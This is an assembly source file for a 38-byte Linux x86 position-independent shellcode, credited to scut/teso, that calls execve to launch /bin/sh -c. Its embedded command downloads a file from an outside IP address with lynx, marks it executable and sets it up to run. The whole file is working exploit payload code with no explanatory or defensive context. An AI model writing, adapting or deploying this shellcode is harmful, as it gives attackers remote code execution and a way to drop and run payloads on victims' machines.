/* 38 byte arbitrary execve PIC linux/x86 shellcode - scut/teso */

.data
.globl	cbegin
.globl	cend

cbegin:

	jmp	jahead

docall:
	pop	%edi

	movl	%edi, %esp
	not	%sp			/* build new stack frame */

	xorl	%eax, %eax		/* read number of arguments */
	movb	(%edi), %al
	inc	%edi

decl1:	push	%edi
decl2:	scasb				/* search delim bytes */
	jnz	decl2

	movb	%ah, -1(%edi)
	dec	%eax
	jnz	decl1

	pop	%ebx			/* pathname */
	push	%ebx

	push	%eax
	pop	%edx			/* esp -= 4, edx = &envp[] = NULL */
	movl	%esp, %ecx		/* ecx = &argv[] */

	movb	$11, %al
	int	$0x80

jahead:	call	docall

/* reverse order arguments */
.byte	0x03	/* number of arguments */
.ascii	"lynx -source 123.123.123.123/a>a;chmod +x a;echo ./a"
.byte	0x03
.ascii	"-c"
.byte	0x02
.ascii	"/bin/sh"
.byte	0x01

cend:

